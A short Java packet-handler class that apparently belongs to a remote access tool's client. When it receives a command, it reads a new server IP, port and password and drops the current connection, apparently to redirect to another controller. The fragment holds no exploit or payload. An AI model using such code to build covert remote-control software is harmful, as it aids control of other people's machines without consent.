package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketSESRED extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		Main.ip = Connection.readLine();
		Main.port = Connection.readInt();
		Main.pass = Connection.readLine();
		Connection.socket.close();
	}

}
